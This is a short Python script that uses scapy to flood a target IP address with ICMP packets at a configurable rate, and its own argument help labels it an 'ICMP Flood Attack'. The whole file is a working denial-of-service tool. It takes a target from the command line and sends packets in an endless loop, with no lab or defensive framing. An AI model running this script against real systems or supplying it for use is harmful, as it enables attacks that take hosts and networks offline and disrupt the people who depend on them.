from scapy.all import *
import argparse

def icmp_flood(target_ip, interface, rate=1000):
    ip_layer = IP(dst=target_ip)
    icmp_layer = ICMP()

    packet = ip_layer / icmp_layer
    send(packet, iface=interface, loop=1, verbose=False, inter=1/rate)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ICMP Flood Attack")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("interface", help="Network interface to use")
    parser.add_argument("--rate", type=int, default=1000, help="Rate of packets per second")
    args = parser.parse_args()

    icmp_flood(args.target_ip, args.interface, args.rate)